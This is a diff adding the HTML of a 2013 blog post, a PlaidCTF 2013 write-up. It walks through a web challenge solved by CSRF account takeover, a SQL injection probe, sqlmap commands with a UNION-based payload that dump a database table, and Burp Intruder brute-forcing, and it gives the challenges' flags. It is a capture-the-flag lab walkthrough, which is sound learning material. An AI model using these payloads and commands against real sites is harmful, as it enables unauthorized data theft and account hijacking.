@@ -1,0 +1,198 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>PlaidCTF 2013 Writeup - cubalo</title>
+  <meta name="author" content="Matt">
+
+  
+  <meta name="description" content="Tweet PlaidCTF 2013 Writeup PlaidCTF 2013 was a capture the flag tournament put on by the Plaid Parliament of Pwning and sponsored by ENDGAME. &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://cubalo.github.io/blog/2013/04/21/plaidctf-2013-writeup/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="cubalo" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body >
+  <header role="banner" id="sidebar">
+    <!-- Logo -->
+<aside id="logo" class="clearfix">
+  <div class="clearfix">
+    <a href="/">cubalo</a>
+  </div>
+</aside>
+
+<ul id="menu">
+
+  <li class="title">
+    <h1 id="title"><a href="/">cubalo</a></h1>
+  </li>
+
+
+  <li class="subtitle">
+    <h2 id="subtitle">Ramblings of an OFFSEC grunt</h2>
+  </li>
+
+  <li class="link">
+    <a href="/about/">about</a>
+  </li>
+
+  <li class="link">
+    <a href="http://twitter.com/mchandx/">twitter</a>
+  </li>
+
+
+  <li class="link">
+    <a href="http://github.com/mchandx/">github</a>
+  </li>
+
+  <li class="link rss">
+    <a href="/atom.xml">rss feed</a>
+  </li>
+</ul>
+
+
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:cubalo.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+
+
+<!-- Octopress Love -->
+<aside id="octopress_linkback">
+  <a href="http://octopress.org/">
+    <span class="unicode_square">
+      <span class="unicode_circle">
+        &nbsp;
+      </span>
+    </span>
+    <span class="octopress">Powered by Octopress</span>
+  </a>
+</aside>
+
+  </header>
+  <section id="main">
+    <article class="post">
+  <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/blog/2013/04/21/plaidctf-2013-writeup/" data-via="mchandx" data-counturl="http://cubalo.github.io/blog/2013/04/21/plaidctf-2013-writeup/" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+  
+  <header>
+    
+      <h2 class="entry-title">PlaidCTF 2013 Writeup</h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-04-21T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<p>PlaidCTF 2013 was a capture the flag tournament put on by the <a href="http://ppp.cylab.cmu.edu/wordpress/">Plaid Parliament of Pwning</a> and sponsored by <a href="http://www.endgame.com/#home">ENDGAME</a>. Unfortunately, I was unable to commit 100% to the CTF due to being under the weather and having family in town, but I figured I&#8217;d share what I solved. Most of the challenges were reverse engineering and forensics (not my strongest points), but it was fun nonetheless.</p>
+<h1>charsheet (Web - 150)</h1>
+<p><strong>Problem: My friend is in my D&amp;D campaign - could you get me his character name? He administrates <a href="http://54.234.77.50/" target="_blank">this site</a>. Or <a href="http://54.235.50.140/">here (faster)</a>.</strong></p>
+<p>On the site, there is a RPG Web Profiler app that catalouges RPG characters and their campaigns. The goal is the find the user who admins the site.</p>
+<p>That meant that I needed to find a listing of all users in the game. The problem is that users can choose whether or not to make their profile public (only about 45 at the time of completion did) so I had to find a way to either make users change their profile to public, of get a full listing of active users from the backend database.</p>
+<p>At first, I signed into my profile and found a section where you could set your profile image from a file out on the web, so I figured why not try some CSRF? I inserted a URL that would set a user&#8217;s profile to &#8220;Public&#8221; and saved. As users would hit my profile, it would make their profile Public and anyone could access it.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/profile_pic_uploader.png"><img class="alignnone size-medium wp-image-114" alt="profile_pic_uploader" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/profile_pic_uploader-300x158.png" width="300" height="158" /></a></p>
+<p>The problem with this though was that I had to hope the admin user was live and would hit my profile. To make the likelihood of getting that admin user to give up their privacy, I changed my CSRF link to a URL that would transfer ownership of the account to me. Once I had compromised an account, I would change their profile picture to the CSRF that would make a user switch to &#8220;Public.&#8221;</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/captured_profiles.png"><img class="alignnone size-medium wp-image-111" alt="captured_profiles" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/captured_profiles-300x96.png" width="300" height="96" /></a></p>
+<p>I quickly found that although effective, it would take a long time to complete so I started to explore other options.</p>
+<p>I found a search field and tried a basic &#8221; &#8217; Or 1=1-&#8221; on it and it threw an error! Woohoo!</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_error.png"><img class="alignnone size-medium wp-image-116" alt="sql_error" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_error-300x40.png" width="300" height="40" /></a></p>
+<p>So now I knew that there was a vulnerable MySQL server running in the background. I tried my luck with a raw connection to the database, but no dice so I fired up sqlmap and got to work.</p>
+<p>I pointed it at the site with the following string:</p>
+<pre>./sqlmap.py -u "http://54.234.77.50/search.php?type=contains&amp;cname=1"</pre>
+<p>and compromised the database with the string:</p>
+<pre>type=contains&amp;cname=1') UNION ALL SELECT NULL, NULL, NULL, CONCAT(CHAR(58,105,116,113,58),CHAR(79,71,65,69,80,88,106,99,66,67),CHAR(58,102,118,121,58)), NULL, NULL# AND ('kCbZ'='kCbZ
+---</pre>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_compromise.png"><img class="alignnone size-medium wp-image-115" alt="sql_compromise" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/sql_compromise-300x184.png" width="300" height="184" /></a></p>
+<p>So now all I had to do was run through the database, find the table I wanted and then dump it. Long story short, this was the syntax to do just that:</p>
+<pre>/sqlmap.py -u "http://54.234.77.50/search.php?type=contains&amp;cname=1" -D "charsheet" -T "characters" --dump</pre>
+<p>This dumped a CSV file to the output folder and had three columns with names that could possibly be flags: cname, edited_by, and owner.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/csv_of_users.png"><img class="alignnone size-medium wp-image-113" alt="csv_of_users" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/csv_of_users-300x90.png" width="300" height="90" /></a></p>
+<p>I combined all of these columns into a file and then left only the unique ones in it with this command:</p>
+<pre>sort characters.txt | uniq -u</pre>
+<p>Finally, I pumped this list of about 120 entries to Burp Suite&#8217;s intruder, set it up to submit to the proper location, and started it. Within about 2 minutes the challenge was complete.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/04/correct_flag_charsheet.png"><img class="alignnone size-medium wp-image-112" alt="correct_flag_charsheet" src="http://www.cubalo.com/blog/wp-content/uploads/2013/04/correct_flag_charsheet-300x106.png" width="300" height="106" /></a></p>
+<p><strong>Answer: r3al50ftwar3ftw</strong></p>
+<h1>Unnnnlucky (Misc - 20)</h1>
+<p><strong>Problem: Where does The Plague hide his money?</strong></p>
+<p>This is a reference to the movie <em>Hackers </em>(1995). Unfortunately, the only way to know the answer to this is to have watched the movie.</p>
+<p><strong>Answer: <strong>03087-08351-27H</strong></strong></p>
+
+
+
+</article>
+
+
+    <nav role="navigation" id="pagination">
+
+</nav>
+  </section>
+  
+
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+</body>
+</html>
